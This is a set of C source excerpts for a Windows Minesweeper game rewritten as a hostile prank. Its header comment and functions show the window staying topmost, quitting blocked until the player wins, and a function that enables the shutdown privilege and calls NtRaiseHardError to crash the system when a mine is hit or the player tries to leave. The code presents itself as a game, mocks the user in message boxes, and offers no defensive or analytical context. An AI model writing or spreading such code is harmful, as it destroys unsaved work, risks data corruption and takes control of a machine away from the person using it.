 ...
 * -The game will only let you quit after you win.
 * -The window will always be topmost.
 * -Touching a mine will BSOD the system instantly.
 */
...
static void BlueScreenLMAO()
{
    BOOLEAN bl;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
    unsigned long bruh;
    NtRaiseHardError(0xC0000420, 0, 0, 0, 6, &bruh);
}
...
static void InitBoard( BOARD *p_board )
{
    ...
    CheckMenuItem( hMenu, IDM_EXPERT + (unsigned) p_board->difficulty,
            MF_CHECKED );
    if( p_board->IsMarkQ )
...
static void LaughAtUser(HWND hwnd, BOOL isExit)
{
    if(isExit == TRUE && gameBeaten == FALSE)
    {
        MessageBox(hwnd, L"Do you think there is an escape?", L"Really?", MB_ICONERROR);
        BlueScreenLMAO();
        return;
    }
    else if(isExit == FALSE)
    {
        MessageBox(hwnd, L"Do you really think you can make it easier?", L"Really?", MB_ICONERROR);
        return;
    }
}
...
int WINAPI wWinMain( HINSTANCE hInst, HINSTANCE hPrevInst, LPWSTR cmdline, int cmdshow )
{
    ...
    hWnd = CreateWindowExW( WS_EX_TOOLWINDOW, appname, appname,
	wnd_style,
